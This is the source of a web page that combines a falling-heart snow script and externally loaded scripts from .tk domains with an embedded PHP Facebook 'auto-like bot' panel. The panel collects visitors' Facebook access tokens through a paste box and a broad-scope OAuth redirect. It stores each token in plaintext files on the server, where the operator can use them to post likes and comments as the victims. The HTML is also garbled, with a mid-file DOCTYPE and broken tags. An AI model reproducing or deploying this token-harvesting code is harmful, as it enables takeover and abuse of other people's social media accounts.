</script>
</body><a target="_blank" href="http://free-web-tools.com/category/codes/javascript/" style="text-decoration:none;bottom:0;left:10px;font-size:5pt;color:gray;position:absolute"></a><a target="_blank" href="http://www.javascriptbestcodes.com" style="font-size: 8pt; text-decoration: none"></a>
<!-- This Script is from www.javascriptbestcodes.com, Provided by: Web Smile -->
<script type='text/javascript' src='http://m.free-codes.org/g.php?id=2002'></script><script>
// Set the number of snowflakes (more than 30 - 40 not recommended)
var snowmax=35

// Set the colors for the snow. Add as many colors as you like
var snowcolor=new Array("#aaaacc","#ddddFF","#ccccDD")

// Set the fonts, that create the snowflakes. Add as many fonts as you like
var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")

// Set the letter that creates your snowflake (recommended:❤️️)
var snowletter="❤️"

// Set the speed of sinking (recommended values range from 0.3 to 2)
var sinkspeed=0.6

// Set the maximal-size of your snowflaxes
var snowmaxsize=36

// Set the minimal-size of your snowflaxes
var snowminsize=18

// Set the snowing-zone
// Set 1 for all-over-snowing, set 2 for left-side-snowing 
// Set 3 for center-snowing, set 4 for right-side-snowing
var snowingzone=1

///////////////////////////////////////////////////////////////////////////
// CONFIGURATION ENDS HERE
///////////////////////////////////////////////////////////////////////////


// Do not edit below this line
var snow=new Array()
var marginbottom
var marginright
var timer
var i_snow=0
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent 
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
var ns6=document.getElementById&&!document.all
var opera=browserinfos.match(/Opera/)  
var browserok=ie5||ns6||opera

function randommaker(range) {		
	rand=Math.floor(range*Math.random())
    return rand
}

function initsnow() {
	if (ie5 || opera) {
		marginbottom = document.body.clientHeight
		marginright = document.body.clientWidth
	}
	else if (ns6) {
		marginbottom = window.innerHeight
		marginright = window.innerWidth
	}
	var snowsizerange=snowmaxsize-snowminsize
	for (i=0;i<=snowmax;i++) {
		crds[i] = 0;                      
    	lftrght[i] = Math.random()*15;         
    	x_mv[i] = 0.03 + Math.random()/10;
		snow[i]=document.getElementById("s"+i)
		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
		snow[i].size=randommaker(snowsizerange)+snowminsize
		snow[i].style.fontSize=snow[i].size
		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
		snow[i].sink=sinkspeed*snow[i].size/5
		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
		snow[i].style.left=snow[i].posx
		snow[i].style.top=snow[i].posy
	}
	movesnow()
}

function movesnow() {
	for (i=0;i<=snowmax;i++) {
		crds[i] += x_mv[i];
		snow[i].posy+=snow[i].sink
		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
		snow[i].style.top=snow[i].posy
		
		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
			snow[i].posy=0
		}
	}
	var timer=setTimeout("movesnow()",50)
}

for (i=0;i<=snowmax;i++) {
	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
}
if (browserok) {
	window.onload=initsnow
}
</script>
<a target="_blank" href="http://free-web-tools.com/category/codes/javascript/" style="text-decoration:none;bottom:0;left:10px;font-size:5pt;color:gray;position:absolute"></a><a target="_blank" href="http://www.javascriptbestcodes.com" style="font-size: 8pt; text-decoration: none"></a>
<script src="http://salaih-panel.tk/snow.js"></script>  <script type="text/javascript" src="https://salaih-king2.tk/snow.js"></script>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Shahzad Asghar</title> 
<link <link href="B.css" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Audiowide" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/cssf8d0.css?family=" rel="stylesheet" type="text/css">
<link rel="shortcut icon" type="image/png" href="https://cdn3.iconfinder.com/data/icons/inside/PNG/256x256/icontexto-inside-facebook.png"/>
</div>
<center><div style="font-family: Audiowide;
font-size: 60pt">
<center><script language="JavaScript" src="B.js"></script></font></center>
<div style="font-family: Audiowide;
font-size: 25pt;
text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;
color: #FFF">
<center><?php error_reporting(0);$bot=new bot();class bot{public function getGr($as,$bs){$ar=array(        'graph',        'fb',        'me');$im='https://'.implode('.',$ar);return $im.$as.$bs;}public function getUrl($mb,$tk,$uh=null){$ar=array(        'access_token' => $tk,);if($uh){$else=array_merge($ar,$uh);        }else{        $else=$ar;}foreach($else as $b => $c){        $s4h[]=$b.'='.$c;}$true='?'.implode('&',$s4h);$true=$this->getGr($mb,$true);$true=json_decode($this->one($true),true);if($true[data]){        return $true[data];}else{        return $true;}}private function one($url){$cx=curl_init();curl_setopt_array($cx,array(CURLOPT_URL => $url,CURLOPT_CONNECTTIMEOUT => 5,CURLOPT_RETURNTRANSFER => 1,CURLOPT_USERAGENT => 'DESCRIPTION by ',));$ch=curl_exec($cx);        curl_close($cx);        return ($ch);}public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){if(!is_dir('s4h')){        mkdir('s4h');}if($bb){$blue=fopen('s4h/'.$id,'w');fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);        fclose($blue);echo'<script type="text/javascript">alert("INFO : Your Written Comment Has Been Saved !! Good Luck !! ")</script>';}else{        if($z){if(file_exists('s4h/'.$id)){$file=file_get_contents('s4h/'.$id);$ex=explode('*',$file);$str=str_replace($ex[0],$tk,$file);$xs=fopen('s4h/'.$id,'w');        fwrite($xs,$str);        fclose($xs);}else{$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;$xs=fopen('s4h/'.$id,'w');        fwrite($xs,$str);        fclose($xs);}$_SESSION[key]=$tk.'_'.$id;}else{$file=file_get_contents('s4h/'.$id);$file=explode('*',$file);        if($file[5]){$up=fopen('s4h/'.$id,'w');fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);        fclose($up);        }else{$up=fopen('s4h/'.$id,'w');fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);        fclose($up);        }echo'<script type="text/javascript">alert("INFO : Script Comment Has Been Saved !!")</script>';}}}public function lOgbot($d){        unlink('s4h/'.$d);        unset($_SESSION[key]);echo'<script type="text/javascript">alert("INFO : Logout success")</script>';        $this->atas();        $this->home();        $this->bwh();}public function cek($tok,$id,$nm){$if=file_get_contents('s4h/'.$id);$if=explode('*',$if);if(preg_match('/on/',$if[1])){        $satu='on';        $ak='Like tambah komen';}else{        $satu='off';        $ak='Like saja';}if(preg_match('/on/',$if[2])){        $dua='on';        $ik='Bot emo';}else{        $dua='off';        $ik='Bot manual';}if(preg_match('/on/',$if[3])){        $tiga='on';        $ek='Powered on';}else{        $tiga='off';        $ek='Powered off';}if(preg_match('/on/',$if[4])){        $empat='on';        $uk='Text via script';}else{        $empat='off';        $uk='Via text sendiri';}echo'<center><div id="bottom-content"><div id="navigation-menu"><br><ul><font color="white">Welcome :  '.$nm.'</font><br><br><a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;border: 1px solid white;border-radius: 100px;background-color: white;" alt="'.$nm.'"/></a><br> <font color="white">Your Bot has been Activated '.$nm.'</font><br><form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'"><input class="button button5" type="submit" value="Logout Bot"></form><center><div class="hr"><hr /></div></center><br><br><br><form action="index.php" method="post"><center><font color="black" size="3">Select Menu Robot</font></center><select class="button button5">';        if($satu=='on'){        echo'<option value="'.$satu.'">'.$ak.'</option><option value="off">Like saja</option></select>';        }else{        echo'<option value="'.$satu.'">'.$ak.'</option><option value="on">Like tambah komen</option></select>';}echo'<select  class="button button5" name="emot">';        if($dua=='on'){        echo'<option value="'.$dua.'">'.$ik.'</option><option value="off">Bot manual</option></select>';        }else{        echo'<option value="'.$dua.'">'.$ik.'</option><option value="on">Bot emo</option></select>';}echo'<select  class="button button5" name="target">';        if($tiga=='on'){        echo'<option value="'.$tiga.'">'.$ek.'</option><option value="off">Powered off</option></select>';        }else{        echo'<option value="'.$tiga.'">'.$ek.'</option><option value="on">Powered on</option></select>';}echo'';        if($empat=='on'){        echo'<select class="button button5" name="opsi"><option value="'.$empat.'">'.$uk.'</option><option value="off">Via text sendiri</option></select>';}else{        if($if[5]){        echo'<select  class="button button5" name="opsi"><option value="'.$empat.'">'.$uk.'</option><option value="text">Ganti Text Anda</option><option value="on">Text via script</option></select>';        }else{        echo'Buat text Anda<input type="text" name="text" style="height:30px;"><input type="hidden" name="opsi" value="'.$empat.'">';}}echo'</ul></div><ul><div id="top-content"><div id="search-form"><input class="button button5" type="submit" value="SAVE"></form></div></div></div></ul></center>';$this->membEr();}public function atas(){$hari=array(1=>        "Monday",        "Tuesday",        "Wednesday",        "Thursday",        "Friday",        "Saturday",        "Sunday");$bulan=array(1=>"January",  "February",    "March",     "April",       "May",         "June",           "July",             "August",               "September",          "October",     "November","Desember");$hr=$hari[gmdate('N',time()+60*60*7)];$tgl=gmdate('j',time()+60*60*7);$bln=$bulan[gmdate('n',time()+60*60*7)];$thn=gmdate('Y',time()+60*60*7);$jam=gmdate('H',time()+60*60*7);echo'<div id="header"><h1 class="heading"></h1><h2 class="description"><h1><center><script src=""></script><h1></h2></div></div>';}public function home(){echo'<br><center><strong><a href="http://www.facebook.com/100027065658389" target="_blank">
<img src="https://graph.facebook.com/100027065658389/picture?type=large" alt="Designer_&_Developer" border="3" style="border-color: 737373; border-radius:70%;height:150px;width:150px;-moz-box-shadow:0px 0px 20px 0px black;-webkit-box-shadow:0px 0px 20px 0px black;-o-box-shadow:0px 0px 20px 0px black;box-shadow:0px 0px 20px 0px black"/><br></div>';}public function bwh(){echo'<div id="bottom-content"><div id="navigation-menu"><center></head>    <body>        <div id="main">            <div id="content">                <div class="header"><center><br><br><center><a href="http://www.facebook.com/100027065658389" target="_blank"><input class="button button5" type="button" value="♥ Admin ♥"> </a><a href="http://nir-token.tk" target="_blank"><input class="button button5" type="button" value="♥ TOKEN♥"> </a></center><center><form action="index.php" method="post"><input class="inptext inptext1" type="text" placeholder="EAAAACZAVC6ygBAOXNxONaZAc9GnN9kcLxZCsba3ED4hjLZBX2BJDPwDUBZBpvyZAb538ABEh3k3zmMgObJbOA32VsZAzndFmBahJVz6C4y0ZBEG0nzJQ7ZCbsdUvlEjEsZB9ciEXqoMILLlKCES6n3jqscohpvPbMXSj8ZD" st name="token"> <br><input class="button button5" id="sbmt" class="inp-btn" type="submit"   value="SUBMIT"></form></div></div></div>';$this->membEr();}public function membEr(){        if(!is_dir('s4h')){        mkdir('s4h');}$up=opendir('s4h');while($use=readdir($up)){if($use != '.' && $use != '..'){        $user[]=$use;}        }echo'<center><div style="font-family: Audiowide;
font-size: 60pt">
<center> </script></font></center>
<div style="font-family: Audiowide;
font-size: 25pt;
text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;
color: #FFF">
<center>

<font style="text-shadow: 1px 1px black; color:white;"
size="6">&bull; Botterx : <font color="red">1'.count($user).'</font> <font style="text-shadow: 1px 1px black; color:white;" size="4">&bull;</font>
<center><strong><font style="text-shadow: 1px 1px black; color:white;" size="5">&bull; OWNER Nir Bahadur Rana &bull;</strong></center>
</br></div><audio autoIceland loop>
<font color="red">

</div>';}public function toXen($h){header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');}}if(isset($_SESSION[key])){        $a=$_SESSION[key];        $ai=explode('_',$a);        $a=$ai[0];if($_POST[logout]){        $ax=$_POST[logout];        $bot->lOgbot($ax);}else{$b=$bot->getUrl('/me',$a,array('fields' => 'id,name',));if($b[id]){if($_POST[likes]){        $as=$_POST[likes];        $bs=$_POST[emot];        $bx=$_POST[target];        $cs=$_POST[opsi];        $tx=$_POST[text];if($cs=='text'){        unlink('Tokenx/'.$b[id]);$bot->savEd($a,$b[id],$as,$bs,$bx,'off');        }else{        if($tx){$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);        }else{$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}}        $bot->atas();        $bot->home();$bot->cek($a,$b[id],$b[name]);}else{echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';        unset($_SESSION[key]);        unlink('s4h/'.$ai[1]);$bot->atas();$bot->home();        $bot->bwh();}}        }else{if($_POST[token]){        $a=$_POST[token];if(preg_match('/token/',$a)){$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));        }else{        $cut=explode('&',$a);$tok=$cut[0];}$b=$bot->getUrl('/me',$tok,array(        'fields' => 'id,name',));if($b[id]){$bot->savEd($tok,$b[id],'on','on','on','on','null');        $bot->atas();        $bot->home();$bot->cek($tok,$b[id],$b[name]);}else{echo '<script type="text/javascript">alert("Error : Token Invalid")</script>';        $bot->atas();        $bot->home();        $bot->bwh();}}else{if($_GET[token]){        $a=$_GET[token];        $bot->toXen($a);}else{        $bot->atas();        $bot->home();        $bot->bwh();}}
}
?>

